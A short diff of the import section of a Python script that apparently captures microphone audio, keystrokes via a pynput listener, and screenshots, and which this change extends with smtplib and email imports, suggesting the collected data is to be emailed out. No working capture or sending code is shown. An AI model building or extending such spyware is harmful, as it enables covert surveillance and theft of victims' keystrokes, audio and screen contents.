@@ -2,11 +2,11 @@
 
 import sounddevice as sd
 from scipy.io.wavfile import write
-import sounddevice as sd
-from scipy.io.wavfile import write
 from pynput.keyboard import Key, Listener
 import time
 from PIL import ImageGrab
+import smtplib
+from email.mime.text import MIMEText
 
 microphone_time = 10
 audio_information = "data\\aduio.wav"
